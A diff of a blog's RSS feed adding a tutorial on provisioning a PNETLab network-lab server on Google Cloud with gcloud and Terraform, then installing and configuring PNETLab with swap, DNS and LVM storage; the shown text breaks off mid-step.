@@ -5,7 +5,373 @@
     <link>https://fahmifj.github.io/</link>
     <description>Recent content on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Wed, 29 Jan 2025 20:36:34 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 26 Mar 2025 13:27:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Deploy PNETLab on Google Cloud</title>
+      <link>https://fahmifj.github.io/articles/deploy-pnetlab-on-google-cloud/</link>
+      <pubDate>Wed, 26 Mar 2025 13:27:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/articles/deploy-pnetlab-on-google-cloud/</guid>
+      <description>In the previous articles, I had an issue with Mac/Orbstack&amp;rsquo;s networking system, that prevented my localhost from communicating with the GNS3 appliances. Since I didn&amp;rsquo;t have enough time to troubleshoot it myself, I decided to give PNETLab a try.
+This time, I leveraged my GCP free trial to deploy the PNETLab server and used Terraform to automate the server provisioning. Then, I will use Tailscale to securely access the lab without exposing it to the Internet.</description>
+      <content:encoded><![CDATA[<p>In the previous articles, I had an issue with Mac/Orbstack&rsquo;s networking system, that prevented my localhost from communicating with the GNS3 appliances. Since I didn&rsquo;t have enough time to troubleshoot it myself, I decided to give PNETLab a try.</p>
+<p>This time, I leveraged my GCP free trial to deploy the PNETLab server and used Terraform to automate the server provisioning. Then, I will use Tailscale to securely access the lab without exposing it to the Internet.</p>
+<p><strong>Prerequisites</strong></p>
+<ul>
+<li>GCP CLI installed.</li>
+<li>Terraform installed.</li>
+<li>Tailscale account (free).</li>
+<li>Domain name.</li>
+</ul>
+<h2 id="network-diagram-overview">Network Diagram Overview</h2>
+<p>Here&rsquo;s an overview of what we going to do.</p>
+<img src="./imgs/image-20250326131830503.png" alt="image-20250326131830503" style="zoom:50%;" />
+<h2 id="preparing-gcp-project">Preparing GCP project</h2>
+<p>Before we begin, make sure that you&rsquo;ve authenticated to GCP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud auth application-default login
+</span></span></code></pre></div><p>Once authenticated, create a project for our PNETLab deployment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nv">PROJECT_ID</span><span class="o">=</span>pnetlab-<span class="nv">$RANDOM</span>
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$PROJECT_ID</span>
+</span></span><span class="line"><span class="cl">pnetlab-xxx
+</span></span><span class="line"><span class="cl">$ gcloud projects create <span class="nv">$PROJECT_ID</span> --set-as-default
+</span></span></code></pre></div><p>Then, link the project to your billing account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud billing accounts list              
+</span></span><span class="line"><span class="cl">ACCOUNT_ID            NAME                OPEN  MASTER_ACCOUNT_ID
+</span></span><span class="line"><span class="cl">AAAAAA-BBBBBB-CCCCCC  My Billing Account  True
+</span></span><span class="line"><span class="cl">$ gcloud billing projects link <span class="nv">$PROJECT_ID</span> --billing-account<span class="o">=</span>AAAAAA-BBBBBB-CCCCCC
+</span></span></code></pre></div><p>Last, enable Google Compute API.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud services <span class="nb">enable</span> compute.googleapis.com
+</span></span></code></pre></div><h2 id="server-deployment">Server Deployment</h2>
+<h3 id="preparing-terraform-code">Preparing Terraform Code</h3>
+<p>We&rsquo;ll use the following folder structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── README.MD
+</span></span><span class="line"><span class="cl">├── ansible
+</span></span><span class="line"><span class="cl">└── terraform
+</span></span><span class="line"><span class="cl">    ├── terraforms.tfvars <span class="c1">#sensitive file (project_id, region, user/keys)</span>
+</span></span><span class="line"><span class="cl">    ├── main.tf 
+</span></span><span class="line"><span class="cl">    └── variables.tf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">3</span> directories, <span class="m">5</span> files
+</span></span></code></pre></div><p>Within the terraform folder, initialize the terraform working directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ terraform init
+</span></span></code></pre></div><h4 id="terraformtfvars">terraform.tfvars</h4>
+<p><code>terraforms.tfvars</code> contains the following (make your adjustment):</p>
+<pre tabindex="0"><code>project_id      = &#34;&#34;
+region          = &#34;&#34;
+zone            = &#34;&#34;
+os_image        = &#34;projects/ubuntu-os-cloud/global/images/ubuntu-1804-bionic-v20240116a&#34;
+ssh_user        = &#34;username&#34;
+ssh_pub_user    = &#34;ssh-ed25519 AAAAC3N... root&#34;
+ssh_pub_ansible = &#34;ssh-ed25519 AAAAC3N... ansible&#34;
+</code></pre><h4 id="maintf">main.tf</h4>
+<p><code>main.tf</code> file contains the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">terraform</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">required_providers</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">google</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">      <span class="err">source</span> <span class="err">=</span> <span class="nt">&#34;hashicorp/google&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">version</span> <span class="err">=</span> <span class="s2">&#34;~&gt; 4.5&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">provider</span> <span class="s2">&#34;google&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">project</span> <span class="err">=</span> <span class="err">var.project_id</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span>  <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">zone</span>    <span class="err">=</span> <span class="err">var.zone</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">NETWORK</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_network&#34;</span> <span class="s2">&#34;pnetlab_vpc&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>                    <span class="err">=</span> <span class="nt">&#34;pnetlab-vpc&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">auto_create_subnetworks</span> <span class="err">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_subnetwork&#34;</span> <span class="s2">&#34;pnetlab_subnet&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>          <span class="err">=</span> <span class="nt">&#34;pnetlab-subnet&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span>       <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">  <span class="err">ip_cidr_range</span> <span class="err">=</span> <span class="s2">&#34;10.10.1.0/24&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_firewall&#34;</span> <span class="s2">&#34;allow_ssh_access&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>    <span class="err">=</span> <span class="nt">&#34;allow-ssh&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span> <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">allow</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">protocol</span> <span class="err">=</span> <span class="nt">&#34;tcp&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">ports</span>    <span class="err">=</span> <span class="p">[</span><span class="s2">&#34;22&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">source_ranges</span> <span class="err">=</span> <span class="p">[</span> <span class="s2">&#34;0.0.0.0/0&#34;</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">NAT</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_router&#34;</span> <span class="s2">&#34;pnetlab_router&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span> <span class="err">=</span> <span class="nt">&#34;pnetlab-router&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span> <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span> <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_router_nat&#34;</span> <span class="s2">&#34;pnetlab_router_nat&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span> <span class="err">=</span> <span class="nt">&#34;pnetlab-router-nat&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span> <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">router</span> <span class="err">=</span> <span class="err">google_compute_router.pnetlab_router.name</span>
+</span></span><span class="line"><span class="cl">  <span class="err">nat_ip_allocate_option</span> <span class="err">=</span> <span class="s2">&#34;AUTO_ONLY&#34;</span> <span class="err">#</span> <span class="err">use</span> <span class="err">dynamic</span> <span class="err">public</span> <span class="err">ip</span> <span class="err">for</span> <span class="err">nat</span>
+</span></span><span class="line"><span class="cl">  <span class="err">source_subnetwork_ip_ranges_to_nat</span> <span class="err">=</span> <span class="s2">&#34;ALL_SUBNETWORKS_ALL_IP_RANGES&#34;</span> <span class="err">#</span> <span class="err">nat</span> <span class="err">any</span> <span class="err">sources</span> <span class="err">ip</span> <span class="err">range</span> <span class="err">available</span> <span class="err">within</span> <span class="err">the</span> <span class="err">vpc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">EXT</span> <span class="err">DISK</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_disk&#34;</span> <span class="s2">&#34;additional_disk&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>   <span class="err">=</span> <span class="nt">&#34;pnetlab-additional-disk&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>   <span class="err">=</span> <span class="s2">&#34;pd-standard&#34;</span>  <span class="err">#</span> <span class="err">Choose</span> <span class="err">disk</span> <span class="err">type</span> <span class="err">(pd-standard</span><span class="p">,</span> <span class="err">pd-ssd,</span> <span class="err">etc.)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">size</span> <span class="err">=</span> <span class="err">100</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">lifecycle</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">prevent_destroy</span> <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">INSTANCES</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">ubuntu</span><span class="mi">-1804</span><span class="err">-bionic-v</span><span class="mi">20240116</span><span class="err">a</span>                                 <span class="err">ubuntu-os-cloud</span>      <span class="err">ubuntu</span><span class="mi">-1804</span><span class="err">-lts</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_instance&#34;</span> <span class="s2">&#34;pnetlab_server&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>         <span class="err">=</span> <span class="nt">&#34;pnetlab-server&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">machine_type</span> <span class="err">=</span> <span class="s2">&#34;n2-standard-2&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">tags</span>         <span class="err">=</span> <span class="p">[</span><span class="s2">&#34;pnetlab&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">boot_disk</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">initialize_params</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">      <span class="err">image</span> <span class="err">=</span> <span class="err">var.os_image</span> <span class="err">#</span> <span class="err">cloud</span> <span class="err">image</span>
+</span></span><span class="line"><span class="cl">      <span class="err">size</span>  <span class="err">=</span> <span class="err">20</span>                 <span class="err">#</span> <span class="err">assign</span> <span class="err">20gb</span>
+</span></span><span class="line"><span class="cl">      <span class="err">type</span>  <span class="err">=</span> <span class="nt">&#34;pd-standard&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="err">#</span> <span class="err">external</span> <span class="err">disk</span> <span class="mi">100</span><span class="err">gb</span>
+</span></span><span class="line"><span class="cl">  <span class="err">attached_disk</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">source</span> <span class="err">=</span> <span class="err">google_compute_disk.additional_disk.id</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">network_interface</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">network</span>    <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">    <span class="err">subnetwork</span> <span class="err">=</span> <span class="err">google_compute_subnetwork.pnetlab_subnet.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Disable</span> <span class="err">public</span> <span class="err">IP</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">access_config</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span>  <span class="err">network_tier</span> <span class="err">=</span> <span class="nt">&#34;STANDARD&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">scheduling</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">automatic_restart</span>           <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">    <span class="err">on_host_maintenance</span>         <span class="err">=</span> <span class="nt">&#34;MIGRATE&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">preemptible</span>                 <span class="err">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">    <span class="err">provisioning_model</span>          <span class="err">=</span> <span class="s2">&#34;STANDARD&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">advanced_machine_features</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">enable_nested_virtualization</span> <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="err">metadata</span> <span class="err">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">ssh-keys</span> <span class="err">=</span> <span class="nt">&#34;${var.ssh_user}:${var.ssh_pub_user} \n${var.ssh_user}:${var.ssh_pub_ansible}&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></div><h4 id="variablestf">variables.tf</h4>
+<p><code>variables.tf</code> define the variables we used in the <code>tfvars</code> file, it contains:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;project_id&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project ID&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;region&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project region&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">default</span>     <span class="err">=</span> <span class="s2">&#34;us-central&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;zone&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project zone&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">default</span>     <span class="err">=</span> <span class="s2">&#34;us-central1-a&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;os_image&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;OS family&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_user&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The sudo user&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_pub_user&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The public key used for authentication to an instance. Format: [public key] [username]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_pub_ansible&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The public key used for configuration management. Format: [public key] [username]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="apply-configuration">Apply Configuration</h3>
+<p>With all the resource files defined, we will run the following command in the terraform directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ terraform fmt         <span class="c1">#Format your Terraform files  </span>
+</span></span><span class="line"><span class="cl">$ terraform validate    <span class="c1">#Check for syntax errors  </span>
+</span></span><span class="line"><span class="cl">$ terraform plan -out pnetlab-deploy       <span class="c1">#Preview the infrastructure changes  </span>
+</span></span><span class="line"><span class="cl">$ terraform apply pnetlab-deploy -auto-approve  <span class="c1"># Deploy the resources  </span>
+</span></span></code></pre></div><p>After it finishes, check if the instance is running:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud compute instances list --filter<span class="o">=</span><span class="s2">&#34;name=pnetlab-server&#34;</span> --project<span class="o">=</span><span class="s2">&#34;</span><span class="nv">$PROJECT_ID</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><h2 id="installing-pnetlab">Installing PNETLab</h2>
+<p>For this step, some are just copy-paste from the official installation guide at the <a href="https://www.pnetlab.com/pages/documentation?slug=how-to-deploy-pnetlab-box-on-google-cloud">PNETLab website</a>.</p>
+<h3 id="add-pnetlab-repository">Add PNETLab Repository</h3>
+<p>SSH into the server from the Google Cloud SSH browser. Once we logged in, add and install the pnetlab package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ sudo su -
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;deb [trusted=yes] http://repo.pnetlab.com ./&#34;</span> <span class="p">|</span> sudo tee -a /etc/apt/sources.list
+</span></span><span class="line"><span class="cl">$ sudo apt-get update
+</span></span><span class="line"><span class="cl">$ sudo apt-get install pnetlab
+</span></span></code></pre></div><h3 id="create-swap-memory">Create Swap Memory</h3>
+<p>Create a swap disk, allocate the size according to your need.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# fallocate -l 1G /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# chmod <span class="m">600</span> /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkswap /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# swapon /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# cp /etc/fstab<span class="o">{</span>,.bak<span class="o">}</span>
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# <span class="s1">&#39;/swapfile none swap sw 0 0&#39;</span> <span class="p">|</span> sudo tee -a /etc/fsta
+</span></span></code></pre></div><h3 id="configure-pnetlab-dns">Configure PNETLab DNS</h3>
+<p>Edit file <code>/etc/network/interfaces</code> add line <code>dns-nameservers 8.8.8.8</code> to the configuration of interface <code>pnet0</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="c"># The primary network interface</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iface</span> <span class="nx">eth0</span> <span class="nx">inet</span> <span class="nx">manual</span>
+</span></span><span class="line"><span class="cl"><span class="nx">auto</span> <span class="nx">pnet0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iface</span> <span class="nx">pnet0</span> <span class="nx">inet</span> <span class="nx">dhcp</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">dns-nameservers</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">bridge_ports</span> <span class="nx">eth0</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">bridge_stp</span> <span class="nx">off</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span></code></pre></div><p>And restart the networking service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# sudo service networking restart
+</span></span></code></pre></div><h3 id="configure-additional-disk">Configure Additional Disk</h3>
+<p>Time to add the additional disk we defined in the terraform resource. The purpose of this disk is to store all the pnetlab project files as well as the images later.</p>
+<p>In my case, the additional disk is available at <code>/dev/sdb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# lsblk
+</span></span><span class="line"><span class="cl">NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+</span></span><span class="line"><span class="cl">loop0     7:0    <span class="m">0</span> 40.4M  <span class="m">1</span> loop /snap/snapd/20671
+</span></span><span class="line"><span class="cl">loop1     7:1    <span class="m">0</span>  368M  <span class="m">1</span> loop /snap/google-cloud-cli/203
+</span></span><span class="line"><span class="cl">loop2     7:2    <span class="m">0</span> 63.9M  <span class="m">1</span> loop /snap/core20/2105
+</span></span><span class="line"><span class="cl">sda       8:0    <span class="m">0</span>   20G  <span class="m">0</span> disk 
+</span></span><span class="line"><span class="cl">├─sda1    8:1    <span class="m">0</span> 19.9G  <span class="m">0</span> part /
+</span></span><span class="line"><span class="cl">├─sda14   8:14   <span class="m">0</span>    4M  <span class="m">0</span> part 
+</span></span><span class="line"><span class="cl">└─sda15   8:15   <span class="m">0</span>  106M  <span class="m">0</span> part /boot/efi
+</span></span><span class="line"><span class="cl">sdb       8:16   <span class="m">0</span>  100G  <span class="m">0</span> disk 
+</span></span></code></pre></div><p>We&rsquo;ll create an LVM disk out of it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# vgcreate /dev/vg01 /dev/sdb
+</span></span><span class="line"><span class="cl">  Volume group <span class="s2">&#34;vg01&#34;</span> successfully created
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# lvcreate -l 100%FREE --name lv01 vg01 
+</span></span><span class="line"><span class="cl">  Logical volume <span class="s2">&#34;lv01&#34;</span> created.
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkfs.ext4 /dev/vg01/lv01 
+</span></span><span class="line"><span class="cl">mke2fs 1.44.1 <span class="o">(</span>24-Mar-2018<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Discarding device blocks: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Creating filesystem with <span class="m">26213376</span> 4k blocks and <span class="m">6553600</span> inodes
+</span></span><span class="line"><span class="cl">Filesystem UUID: f1173542-f07c-493f-89e6-188439880465
+</span></span><span class="line"><span class="cl">Superblock backups stored on blocks: 
+</span></span><span class="line"><span class="cl">  32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 
+</span></span><span class="line"><span class="cl">  4096000, 7962624, 11239424, 20480000, <span class="m">23887872</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Allocating group tables: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Writing inode tables: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Creating journal <span class="o">(</span><span class="m">131072</span> blocks<span class="o">)</span>: <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Writing superblocks and filesystem accounting information: <span class="k">done</span>
+</span></span></code></pre></div><p>Then we set a mount point for the volume we just created.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mount /dev/vg01/lv01 /mnt/unetlab
+</span></span></code></pre></div><p>Edit the <code>/etc/fstab</code> file and add the following line to mount <code>/mnt/unetlab</code> on boot:</p>
+<pre tabindex="0"><code>/dev/vg01/lv01  /mnt/unetlab  ext4  defaults  0  0
+</code></pre><p>Now we&rsquo;ll create a new directory for PNETLab project files and image files in our newly mounted disk.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab/addons
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab/labs
+</span></span></code></pre></div><p>Next, we&rsquo;ll remove the old directories for project files and image files, and replace them with symbolic links pointing to the new directories on the mounted disk.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# rm -rf /opt/unetlab/addons/ 
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# rm -rf /opt/unetlab/labs/
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# ln -s /mnt/unetlab/addons/ /opt/unetlab/
